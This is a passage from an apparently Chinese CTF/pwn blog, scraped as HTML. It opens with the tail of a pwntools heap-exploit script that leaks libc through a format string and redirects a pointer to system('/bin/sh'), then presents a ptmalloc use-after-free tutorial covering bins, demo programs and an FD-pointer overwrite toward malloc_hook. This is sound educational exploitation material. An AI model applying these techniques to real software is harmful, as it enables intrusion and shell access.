class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;%33$p&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + p64(printf_plt)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">leak_addr=<span class="built_in">eval</span>(p.recv(<span class="number">14</span>))</span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base=leak_addr-<span class="number">0x1ec6a0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_libc=libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh||&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + p64(system_libc)</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/" class="post-title-link" itemprop="url">Ptmalloc算法：UAF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-16 15:51:12" itemprop="dateCreated datePublished" datetime="2022-01-16T15:51:12+08:00">2022-01-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-03-18 00:12:50" itemprop="dateModified" datetime="2022-03-18T00:12:50+08:00">2022-03-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc算法：UAF"><a href="#Ptmalloc算法：UAF" class="headerlink" title="Ptmalloc算法：UAF"></a>Ptmalloc算法：UAF</h2><p>堆利用中较为常见的漏洞，利用了“free”函数本身的缺陷，对已经置空的指针进行操作</p>
<p>UAF一般有以下几种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong></li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong></li>
</ul>
<p>UAF漏洞主要是后两种，被置空的指针被称为<strong>“dangling pointer”</strong></p>
<hr>
<h2 id="数据结构bins"><a href="#数据结构bins" class="headerlink" title="数据结构bins"></a>数据结构bins</h2><p>简单来说bin就是<strong>free chunk的容器</strong></p>
<p><strong>ptmalloc</strong> 把大小相似的 chunk，用双向链表连接起来，这样就形成了一个 bin，ptmalloc 一共维护了 128 个这样的 bin，并使用数组来存储这些 bin 如下：（32位）</p>
<img src="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/1638959281581-1639312548300-1642849652608-1647533569928.png" class title="1638959281581-1639312548300">
<p>从第2个到第64个bin是small bin，small bin中的chunk<strong>大小相同</strong>，small bin是一个双向链表</p>
<p>在某一条bin中(chunk大小相同)按照<strong>「先入先出」</strong>（FIFO 的规则）进行排序，也就是说，刚被释放的放在前面</p>
<p>bins分类：fast bin，small bin，unsorted bin，large bin</p>
<img src="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/1641885199475-1642849652609-1647533569929.png" class width="1641885199475"> 
<p>bin链都是由当前线程的arena管理的</p>
<p><strong>Fast bin</strong></p>
<p>Fast bin可以看着是 small bins 的一小部分 cache ，设计初衷就是进行快速的小内存分配和释放</p>
<p>概念：chunk 的大小在32字节~128字节（0x20~0x80）的 chunk 称为“fast chunk”（大小不是 malloc 时的大小，而是在内存中 struct malloc_chunk 的大小，包含前2个成员） </p>
<p>特征：</p>
<ul>
<li>Fast bin是 <strong>单向链表</strong> 只有 FD 指针</li>
<li>Fast chunk 不会对其他 free chunk 进行合并</li>
<li>系统将属于 Fast bin 的 chunk 的 PREV_INUSE 位总是设置为1 </li>
<li>Fast bin 中无论是添加还是移除 fast chunk，都是对“链表头”进行操作，而不会对某个中间的 fast chunk 进行操作</li>
</ul>
<p>使用次序：后入先出（可以类比一下栈）</p>
<ul>
<li>释放时：将此 chunk 插入到该 Fast bin 的“链表头”</li>
<li>申请时：优先申请 Fast bin “链表头”处的 chunk（从前向后申请）</li>
</ul>
<p>通常情况下：</p>
<ul>
<li>如果chunk大小 小于“0x40(32位) / 0x80(64位)”，那么该chunk会直接存入Fast bin</li>
<li>如果内存请求 小于“0x40(32位) / 0x80(64位)”，那么程序会优先在 Fast bin 中查找</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *a,*b,*c;</span><br><span class="line">	</span><br><span class="line">	p1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p1<span class="number">-4</span>);</span><br><span class="line">	p2=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p2<span class="number">-4</span>);</span><br><span class="line">	p3=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p3<span class="number">-4</span>);</span><br><span class="line">	p4=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p4<span class="number">-4</span>);</span><br><span class="line">	p5=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p5<span class="number">-4</span>);</span><br><span class="line">	p6=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,p6<span class="number">-4</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(p1); <span class="comment">// 直接插入表头</span></span><br><span class="line">	<span class="built_in">free</span>(p3);</span><br><span class="line">	<span class="built_in">free</span>(p5);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fastbin:%p -&gt; %p -&gt; %p\n&quot;</span>,p5<span class="number">-4</span>,p3<span class="number">-4</span>,p1<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">	a=<span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// 从表头开始申请</span></span><br><span class="line">	b=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	c=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a<span class="number">-4</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,b<span class="number">-4</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,c<span class="number">-4</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./test </span><br><span class="line"><span class="number">0x56000683a000</span></span><br><span class="line"><span class="number">0x56000683a470</span></span><br><span class="line"><span class="number">0x56000683a4d0</span></span><br><span class="line"><span class="number">0x56000683a530</span></span><br><span class="line"><span class="number">0x56000683a590</span></span><br><span class="line"><span class="number">0x56000683a5f0</span></span><br><span class="line">--------------</span><br><span class="line">fastbin:<span class="number">0x56000683a590</span> -&gt; <span class="number">0x56000683a4d0</span> -&gt; <span class="number">0x56000683a000</span></span><br><span class="line">--------------</span><br><span class="line"><span class="number">0x56000683a590</span></span><br><span class="line"><span class="number">0x56000683a4d0</span></span><br><span class="line"><span class="number">0x56000683a000</span></span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>
<p><strong>Small bin</strong></p>
<p>small bins 中一共有 62 个循环双向链表，每个链表中存储的 chunk 大小都一致</p>
<p>使用次序：先入先出（可以类比一下食堂排队）</p>
<ul>
<li>释放时：将此 chunk 插入到该 Small bin 的“链表头”</li>
<li>申请时：优先申请 Small bin “链表尾”处的 chunk（从后向前申请）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *p1,*p2,*p3,*p4;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> a,b,c;</span><br><span class="line">	</span><br><span class="line">	p1=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	p3=<span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">// 直接插入表头</span></span><br><span class="line">	p4=<span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">// 重新分配:把unsortedbin中的chunk转移到smallbin&amp;largebin中</span></span><br><span class="line">	a=p3+<span class="number">0x10</span>; </span><br><span class="line">	</span><br><span class="line">	p1=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	p3=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	p4=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	p1=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	b=p3+<span class="number">0x10</span>;</span><br><span class="line">	</span><br><span class="line">	p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	p3=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	p4=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	c=p3+<span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;smallbin:0x5555%x -&gt; 0x5555%x -&gt; 0x5555%x\n&quot;</span>,c,b,a);</span><br><span class="line">	p1=<span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// 从表尾开始，向前申请</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk1:%p\n&quot;</span>,p1<span class="number">-4</span>);</span><br><span class="line">	p2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk2:%p\n&quot;</span>,p2<span class="number">-4</span>);</span><br><span class="line">	p3=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk3:%p\n&quot;</span>,p3<span class="number">-4</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/桌面] ./test               </span><br><span class="line">smallbin:<span class="number">0x5555a66515b0</span> -&gt; <span class="number">0x5555a6651300</span> -&gt; <span class="number">0x5555a6651050</span></span><br><span class="line">chunk1:<span class="number">0x5580a6651050</span></span><br><span class="line">chunk2:<span class="number">0x5580a6651300</span></span><br><span class="line">chunk3:<span class="number">0x5580a66515b0</span></span><br></pre></td></tr></table></figure>
<p><strong>Large bin</strong></p>
<p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内 </p>
<ul>
<li>概念：大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的</li>
<li>large bin链表的个数为63个，被分为6组</li>
<li>largechunk使用 fd_nextsize、bk_nextsize 连接起来的<ul>
<li>fd_nextsize：指向前一个与当前chunk大小不同的第一个空闲块，不包含 bin 的头指针</li>
<li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针 </li>
</ul>
</li>
<li>合并操作：类似于small bin</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#<span class="function">define <span class="title">largebin_index_32</span><span class="params">(sz)</span>                                                  \</span></span><br><span class="line"><span class="function">    <span class="params">(((((unsigned <span class="keyword">long</span>)</span> <span class="params">(sz)</span>) &gt;&gt; 6) &lt;</span>= <span class="number">38</span>)                                     \</span><br><span class="line">         ? <span class="number">56</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line">#<span class="function">define <span class="title">largebin_index_32_big</span><span class="params">(sz)</span>                                              \</span></span><br><span class="line"><span class="function">    <span class="params">(((((unsigned <span class="keyword">long</span>)</span> <span class="params">(sz)</span>) &gt;&gt; 6) &lt;</span>= <span class="number">45</span>)                                     \</span><br><span class="line">         ? <span class="number">49</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line">#<span class="function">define <span class="title">largebin_index_64</span><span class="params">(sz)</span>                                                  \</span></span><br><span class="line"><span class="function">    <span class="params">(((((unsigned <span class="keyword">long</span>)</span> <span class="params">(sz)</span>) &gt;&gt; 6) &lt;</span>= <span class="number">48</span>)                                     \</span><br><span class="line">         ? <span class="number">48</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((unsigned <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line">#<span class="function">define <span class="title">largebin_index</span><span class="params">(sz)</span>                                                     \</span></span><br><span class="line"><span class="function">    <span class="params">(SIZE_SZ == <span class="number">8</span> ? largebin_index_64(sz)</span> : MALLOC_ALIGNMENT </span>== <span class="number">16</span>             \</span><br><span class="line">                                                ? largebin_index_32_big(sz)    \</span><br><span class="line">                                                : largebin_index_32(sz))</span><br></pre></td></tr></table></figure>
<p><strong>Unsorted bin</strong></p>
<p><strong>没有来得及</strong>被其他bin收入的chunk，就会被认为在unsorted bin中</p>
<p>在使用malloc申请内存时，如果在“fastbin”和“smallbin”中都没有找到合适的free chunk，程序就会在unsorted bin中进行遍历，寻找合适的free chunk，不合适的chunk会被 <strong>排序</strong> 并 <strong>重新分配</strong> 到对应的“bins”中</p>
<h2 id="关于bins的内存分配"><a href="#关于bins的内存分配" class="headerlink" title="关于bins的内存分配"></a>关于bins的内存分配</h2><p>用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk，当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户，这样可以避免频繁的系统调用，降低内存分配的开销</p>
<p>详细过程：</p>
<ul>
<li><p>malloc的时候，不论malloc的大小，ptmalloc首先会去检查每个bins链（除去fastbins链）是否有与malloc相等大小的freechunk，如果没有就去检查bins链中是否有 <strong>大的freechunk</strong> 可以切割</p>
</li>
<li><p>如果存在，那么就切割大的freechunk，那么切割之后 <strong>剩余 </strong>的chunk成为 <strong>last remainder chunk</strong> ，并且last remainder chunk会被放入到 <strong>unsorted bin</strong> 中</p>
</li>
<li><p>如果没有 <strong>大的free chunk</strong> 可以切割，程序就会查询 <strong>top chunk</strong> ，如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1.用户请求的chunk，2.新的top chunk，否则，就需要扩展heap或分配新的heap了——在 <strong>main arena</strong> 中通过 <strong>sbrk</strong> 扩展heap，而在 <strong>thread arena</strong> 中通过 <strong>mmap</strong> 分配新的heap</p>
</li>
</ul>
<p>流程图：</p>
<img src="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/1638952496892-1642849652609-1647533569929.png" class width="1638952496892"> 
<h2 id="UAF的利用姿势"><a href="#UAF的利用姿势" class="headerlink" title="UAF的利用姿势"></a>UAF的利用姿势</h2><p>UAF的利用比较简单，重点看下程序的“free模块”，看下哪些指针没有被置空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *a;</span><br><span class="line">    a = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>); <span class="comment">//申请a</span></span><br><span class="line">    <span class="built_in">memcpy</span>(a,<span class="string">&quot;ywhkkx&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a addr:%x,%s\n&quot;</span>,a,a);</span><br><span class="line">    <span class="built_in">free</span>(a); <span class="comment">//释放a</span></span><br><span class="line">    <span class="keyword">char</span> *b;</span><br><span class="line">    b = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>); <span class="comment">//申请相同大小的b</span></span><br><span class="line">    <span class="built_in">memcpy</span>(a,<span class="string">&quot;isacaib&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b addr:%x,%s\n&quot;</span>,b,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a addr:%x,%s\n&quot;</span>,a,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a addr:<span class="number">6792</span>d2a0,ywhkkx</span><br><span class="line">b addr:<span class="number">6792</span>d2a0,isacaib</span><br><span class="line">a addr:<span class="number">6792</span>d2a0,isacaib</span><br></pre></td></tr></table></figure>
<p>可以发现，“a”和“b”指向了同一片内存：对“a”进行控制，就相当于控制了“b”</p>
<h2 id="UAF利用姿势"><a href="#UAF利用姿势" class="headerlink" title="UAF利用姿势"></a>UAF利用姿势</h2><p>利用条件：</p>
<ul>
<li>“free模块”没有置空指针</li>
<li>可以对chunk进行读写</li>
</ul>
<p>利用效果：</p>
<ul>
<li>WAA</li>
</ul>
<p>利用姿势：</p>
<p>一，申请一个chunk，然后释放：</p>
<img src="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/1642849862503-1647533569929.png" class width="1642849862503"> 
<p>二，修改该chunk的FD指针为“ Malloc_hook - 0x10 ”：</p>
<img src="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/1642849962521-1647533569929.png" class width="1642849962521"> 
<p>三，再次申请chunk，并进行修改</p>
<p>原理总述：</p>
<p>利用UAF的特性（可以申请到相同的chunk），先在某个chunk的FD指针中写入 “目标地址 - 0x10” ，程序会误以为它是某个chunk，于是会把这片区域当成chunk给申请出来，最后就可以直接修改了</p>
